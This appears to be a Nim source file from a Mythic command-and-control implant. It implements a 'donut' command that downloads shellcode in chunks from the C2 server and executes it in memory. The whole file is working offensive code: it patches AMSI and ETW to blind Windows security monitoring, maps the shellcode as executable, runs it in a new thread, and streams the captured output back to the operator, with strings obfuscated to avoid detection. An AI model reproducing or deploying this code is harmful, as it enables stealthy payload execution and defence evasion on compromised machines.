import ../utils/m_responses
import ../utils/debug
import ../utils/strenc
import std/[json, base64, strformat, times]

when defined(windows):
  import winim/lean
  import ../utils/patches

type
  DonutArgs = object
    uuid: string
    assembly_name: string
    assembly_arguments: string
    timeout: int
    patch_amsi_arg: bool
    block_etw_arg: bool

proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode

# Forward declaration
proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string, 
                        totalChunks: int, currentChunk: int, 
                        fileData: var seq[byte]): JsonNode

proc donut*(taskId: string, params: JsonNode): JsonNode =
  when defined(windows):
    try:
      # Parse full args (uuid required)
      let args = to(params, DonutArgs)
      
      debug &"[DEBUG] Donut execution: {args.assembly_name}"
      debug &"[DEBUG] UUID for download: {args.uuid}"
      
      # Return initial response - request the file from Mythic
      return %*{
        obf("task_id"): taskId,
        obf("upload"): {
          obf("file_id"): args.uuid,
          obf("chunk_num"): 1,
          obf("chunk_size"): 512000,
          obf("full_path"): ""
        }
      }
      
    except Exception as e:
      return mythicError(taskId, obf("Donut error: ") & e.msg)
  else:
    return mythicError(taskId, obf("donut command is only available on Windows"))

proc processDonutChunk*(taskId: string, params: JsonNode, chunkData: string, 
                        totalChunks: int, currentChunk: int, 
                        fileData: var seq[byte]): JsonNode =
  ## Process a chunk of the shellcode file being downloaded
  when defined(windows):
    try:
      let args = to(params, DonutArgs)
      
      # Decode and append chunk data
      let decodedChunk = decode(chunkData)
      for b in decodedChunk:
        fileData.add(cast[byte](b))
      
      debug &"[DEBUG] Donut: Received chunk {currentChunk}/{totalChunks}, accumulated {fileData.len} bytes"
      
      # If more chunks remain, request the next one
      if currentChunk < totalChunks:
        return %*{
          obf("task_id"): taskId,
          obf("upload"): {
            obf("chunk_size"): 512000,
            obf("file_id"): args.uuid,
            obf("chunk_num"): currentChunk + 1,
            obf("full_path"): ""
          }
        }
      
      # All chunks received - execute the shellcode
      return executeDonutShellcode(taskId, fileData, params)
      
    except Exception as e:
      return mythicError(taskId, obf("Donut chunk processing error: ") & e.msg)
  else:
    return mythicError(taskId, obf("donut command is only available on Windows"))

when defined(windows):
  type
    DonutExecState = object
      active: bool
      hThread: HANDLE
      stdoutRead: HANDLE
      stderrRead: HANDLE
      stdoutWrite: HANDLE
      stderrWrite: HANDLE
      originalStdout: HANDLE
      originalStderr: HANDLE
      pShellcode: pointer
      shellcodeLen: int
      assemblyName: string
      capturedOutput: string
      capturedStderr: string
      patchOutput: string  # AMSI/ETW patch messages
      deadline: float  # epochTime deadline
      gotOutput: bool  # Whether any output has been received
      lastOutputTime: float  # epochTime of last output received

  var donutExecState: DonutExecState

  proc drainPipes(state: var DonutExecState) =
    ## Non-blocking drain of stdout/stderr pipes
    var buffer: array[4096, char]
    var bytesRead: DWORD
    var bytesAvail: DWORD
    
    while PeekNamedPipe(state.stdoutRead, nil, 0, nil, addr bytesAvail, nil) != 0 and bytesAvail > 0:
      let toRead = min(bytesAvail.int, 4096).DWORD
      if ReadFile(state.stdoutRead, addr buffer[0], toRead, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          state.capturedOutput.add(buffer[i])
      else:
        break
    
    while PeekNamedPipe(state.stderrRead, nil, 0, nil, addr bytesAvail, nil) != 0 and bytesAvail > 0:
      let toRead = min(bytesAvail.int, 4096).DWORD
      if ReadFile(state.stderrRead, addr buffer[0], toRead, addr bytesRead, nil) != 0 and bytesRead > 0:
        for i in 0..<bytesRead:
          state.capturedStderr.add(buffer[i])
      else:
        break

  proc cleanupDonutExec(state: var DonutExecState) =
    ## Clean up all handles
    CloseHandle(state.stdoutWrite)
    CloseHandle(state.stderrWrite)
    # Final drain after closing write ends
    drainPipes(state)
    CloseHandle(state.stdoutRead)
    CloseHandle(state.stderrRead)
    CloseHandle(state.hThread)
    discard VirtualFree(state.pShellcode, 0, MEM_RELEASE)
    state.active = false

proc checkDonutExecution*(taskId: string): JsonNode =
  ## Called each main loop iteration to poll the donut thread and drain output.
  when defined(windows):
    if not donutExecState.active:
      return nil
    
    # Drain pipes and track whether new output arrived
    let prevLen = donutExecState.capturedOutput.len + donutExecState.capturedStderr.len
    drainPipes(donutExecState)
    let newLen = donutExecState.capturedOutput.len + donutExecState.capturedStderr.len
    
    if newLen > prevLen:
      donutExecState.gotOutput = true
      donutExecState.lastOutputTime = epochTime()
    
    # Check if thread finished (0ms wait = non-blocking check)
    let waitResult = WaitForSingleObject(donutExecState.hThread, 0)
    
    if waitResult == WAIT_OBJECT_0:
      # Thread completed — send any remaining output as final response
      var output = donutExecState.patchOutput
      output.add(obf("[+] Donut shellcode executed successfully for ") & donutExecState.assemblyName & obf("\n"))
      cleanupDonutExec(donutExecState)
      if donutExecState.capturedOutput.len > 0:
        output.add(donutExecState.capturedOutput)
      if donutExecState.capturedStderr.len > 0:
        output.add(donutExecState.capturedStderr)
      return mythicSuccess(taskId, output)
    
    # If we got output but nothing new for 10s, assembly is done
    # (with exit_opt=3, the CLR thread stays alive but Main() has returned)
    if donutExecState.gotOutput and (epochTime() - donutExecState.lastOutputTime) >= 10.0:
      discard TerminateThread(donutExecState.hThread, 0)
      var output = donutExecState.patchOutput
      output.add(obf("[+] Donut shellcode executed successfully for ") & donutExecState.assemblyName & obf("\n"))
      cleanupDonutExec(donutExecState)
      if donutExecState.capturedOutput.len > 0:
        output.add(donutExecState.capturedOutput)
      if donutExecState.capturedStderr.len > 0:
        output.add(donutExecState.capturedStderr)
      return mythicSuccess(taskId, output)
    
    # Check timeout
    if epochTime() >= donutExecState.deadline:
      discard TerminateThread(donutExecState.hThread, 0)
      var output = donutExecState.patchOutput
      output.add(obf("[!] Donut shellcode execution timed out\n"))
      cleanupDonutExec(donutExecState)
      if donutExecState.capturedOutput.len > 0:
        output.add(donutExecState.capturedOutput)
      if donutExecState.capturedStderr.len > 0:
        output.add(donutExecState.capturedStderr)
      return mythicSuccess(taskId, output)
    
    # Stream intermediate output to Mythic as it arrives
    if donutExecState.capturedOutput.len > 0 or donutExecState.capturedStderr.len > 0:
      var intermediate = ""
      if donutExecState.capturedOutput.len > 0:
        intermediate.add(donutExecState.capturedOutput)
        donutExecState.capturedOutput = ""
      if donutExecState.capturedStderr.len > 0:
        intermediate.add(donutExecState.capturedStderr)
        donutExecState.capturedStderr = ""
      return mythicProcessing(taskId, intermediate)
    
    # Still running, nothing to report yet
    return nil
  else:
    return nil

proc executeDonutShellcode*(taskId: string, shellcode: seq[byte], params: JsonNode): JsonNode =
  ## Launch donut shellcode in a background thread with pipe-based output capture.
  ## Returns "processing" status immediately; checkDonutExecution polls for completion.
  when defined(windows):
    try:
      let args = to(params, DonutArgs)
      
      debug &"[DEBUG] Executing donut shellcode ({shellcode.len} bytes)"
      
      var patchOutput = ""
      
      # Patch AMSI if requested
      if args.patch_amsi_arg:
        let res = patchAMSI()
        case res
        of 0:
          patchOutput.add(obf("[+] AMSI patched successfully\n"))
        of 1:
          patchOutput.add(obf("[-] Failed to patch AMSI\n"))
        of 2:
          patchOutput.add(obf("[+] AMSI already patched\n"))
        else:
          discard
      
      # Block ETW if requested  
      if args.block_etw_arg:
        let res = patchETW()
        case res
        of 0:
          patchOutput.add(obf("[+] ETW patched successfully\n"))
        of 1:
          patchOutput.add(obf("[-] Failed to patch ETW\n"))
        of 2:
          patchOutput.add(obf("[+] ETW already patched\n"))
        else:
          discard
      
      # Validate shellcode
      if shellcode.len == 0:
        return mythicError(taskId, obf("Shellcode is empty - file download may have failed"))
      
      debug &"[DEBUG] Donut: Allocating {shellcode.len} bytes for shellcode"
      
      # Allocate memory
      let pShellcode = VirtualAlloc(
        nil,
        SIZE_T(shellcode.len),
        MEM_COMMIT or MEM_RESERVE,
        PAGE_READWRITE
      )
      
      if pShellcode == nil:
        let err = GetLastError()
        return mythicError(taskId, obf("VirtualAlloc failed: ") & $err)
      
      copyMem(pShellcode, unsafeAddr shellcode[0], shellcode.len)
      
      # RW -> RX
      var oldProtect: DWORD
      if VirtualProtect(pShellcode, SIZE_T(shellcode.len),
                        PAGE_EXECUTE_READ, addr oldProtect) == 0:
        let err = GetLastError()
        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
        return mythicError(taskId, obf("VirtualProtect failed: ") & $err)
      
      # Create pipes for output capture
      var stdoutRead, stdoutWrite: HANDLE
      var stderrRead, stderrWrite: HANDLE
      var sa: SECURITY_ATTRIBUTES
      sa.nLength = sizeof(SECURITY_ATTRIBUTES).DWORD
      sa.bInheritHandle = 1
      sa.lpSecurityDescriptor = nil
      
      if CreatePipe(addr stdoutRead, addr stdoutWrite, addr sa, 0) == 0:
        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
        return mythicError(taskId, obf("Failed to create stdout pipe"))
      if CreatePipe(addr stderrRead, addr stderrWrite, addr sa, 0) == 0:
        CloseHandle(stdoutRead)
        CloseHandle(stdoutWrite)
        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
        return mythicError(taskId, obf("Failed to create stderr pipe"))
      
      # Redirect stdout/stderr to pipes
      let originalStdout = GetStdHandle(STD_OUTPUT_HANDLE)
      let originalStderr = GetStdHandle(STD_ERROR_HANDLE)
      SetStdHandle(STD_OUTPUT_HANDLE, stdoutWrite)
      SetStdHandle(STD_ERROR_HANDLE, stderrWrite)
      
      # Create execution thread
      var threadId: DWORD
      let hThread = CreateThread(
        nil,
        0,
        cast[LPTHREAD_START_ROUTINE](pShellcode),
        nil,
        0,
        addr threadId
      )
      
      if hThread == 0:
        let err = GetLastError()
        SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
        SetStdHandle(STD_ERROR_HANDLE, originalStderr)
        CloseHandle(stdoutRead)
        CloseHandle(stdoutWrite)
        CloseHandle(stderrRead)
        CloseHandle(stderrWrite)
        discard VirtualFree(pShellcode, 0, MEM_RELEASE)
        return mythicError(taskId, obf("CreateThread failed: ") & $err)
      
      # Give the CLR a moment to cache the redirected console handles,
      # then restore process-wide handles so other threads (debug, agent
      # main loop) don't write into our pipes.
      Sleep(100)
      SetStdHandle(STD_OUTPUT_HANDLE, originalStdout)
      SetStdHandle(STD_ERROR_HANDLE, originalStderr)

      let timeoutSec = if args.timeout > 0: args.timeout else: 30
      
      # Store state for polling
      donutExecState = DonutExecState(
        active: true,
        hThread: hThread,
        stdoutRead: stdoutRead,
        stderrRead: stderrRead,
        stdoutWrite: stdoutWrite,
        stderrWrite: stderrWrite,
        originalStdout: originalStdout,
        originalStderr: originalStderr,
        pShellcode: pShellcode,
        shellcodeLen: shellcode.len,
        assemblyName: args.assembly_name,
        capturedOutput: "",
        capturedStderr: "",
        patchOutput: patchOutput,
        deadline: epochTime() + float(timeoutSec),
        gotOutput: false,
        lastOutputTime: 0.0,
      )
      
      debug &"[DEBUG] Donut: Thread launched, returning to main loop (timeout: {timeoutSec}s)"
      
      # Return processing status - agent stays responsive
      return mythicProcessing(taskId, patchOutput & obf("Donut shellcode executing in background...\n"))
      
    except Exception as e:
      return mythicError(taskId, obf("Donut execution error: ") & e.msg)
  else:
    return mythicError(taskId, obf("donut command is only available on Windows"))